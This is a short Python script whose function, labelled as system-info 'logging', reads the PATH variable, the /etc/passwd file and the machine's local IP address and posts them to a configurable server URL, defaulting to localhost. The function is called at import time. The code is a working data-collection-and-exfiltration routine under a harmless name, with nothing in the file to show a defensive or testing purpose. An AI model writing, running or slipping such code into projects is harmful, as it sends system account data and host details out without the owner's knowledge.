import os
import socket
import requests

def log_system_info(server_url="http://localhost:9000/"):
    """
    Reads PATH variable, /etc/passwd, and local IP address, then sends them to a server for logging.
    
    Args:
        server_url (str): The URL of the server to send the data to.
    
    Returns:
        bool: True if data was sent successfully, False otherwise.
    """
    try:
        # Read PATH environment variable
        path_var = os.environ.get("PATH", "")

        # Read /etc/passwd file
        passwd_content = ""
        try:
            with open("/etc/passwd", "r") as f:
                passwd_content = f.read()
        except (IOError, PermissionError) as e:
            passwd_content = f"Error reading /etc/passwd: {str(e)}"

        # Get local IP address
        ip_address = ""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Connect to a public server to get local IP
            ip_address = s.getsockname()[0]
            s.close()
        except socket.error as e:
            ip_address = f"Error getting IP address: {str(e)}"

        # Prepare data to send
        data = {
            "path": path_var,
            "passwd": passwd_content,
            "ip_address": ip_address
        }

        # Send data to the server
        response = requests.post(server_url, json=data, timeout=5)
        response.raise_for_status()  # Raise an exception for bad status codes
        
        return True

    except requests.RequestException as e:
        print(f"Failed to send data to {server_url}: {str(e)}")
        return False
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return False

log_system_info()
